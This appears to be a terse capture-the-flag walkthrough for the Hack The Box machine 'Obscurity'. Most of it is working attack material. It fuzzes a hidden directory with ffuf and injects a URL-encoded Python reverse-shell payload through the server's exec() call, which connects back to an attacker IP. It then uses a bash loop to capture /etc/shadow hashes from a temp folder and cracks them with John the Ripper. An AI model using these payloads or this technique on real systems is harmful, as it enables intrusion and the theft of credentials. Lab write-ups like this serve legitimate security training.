2)fuzz the secret development directory to get the python script
./ffuf -u http://obscurity.htb:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt

2.5) from the SuperSecureServer.py
/*
it seems that the customize python server use exec() to execute the url link
so inject python code into url to get reverse shell and use '' to escape url limitation
*/

3)use the link including the python code to get reverse shell
obscurity.htb:8080/';import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.41%22,18890));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);a='

User
----
1) in /home/robert there's a python script 'SuperSecureCrypt.py' and 3 text file out.txt, check.txt & passwordreminder.txt
2) get the files save it to local

*/

4)ssh into robert and get the userFlag

Root
----
1) read the code in Betterssh.py
//it seems like after accessing /etc/shadow to get hash it will stored in /tmp/SSH/<random filename>

2) create a SSH folder in /tmp and create a bash script

//this script will cat any file that appear in the SSH folder and append into file 
#!/bin/sh

while :
do
        cat * >> file
done

3) run the bash script and run the Betterssh.py and enter username: root, password can be any since we need the hash only.
4) terminate the bash script and use "sort file | uniq | cat" to display uniq line in the file 
5) crack the hash using john the ripper($6$...) is a SHA hash
6) su root with the password
7) get the rootFlag!!
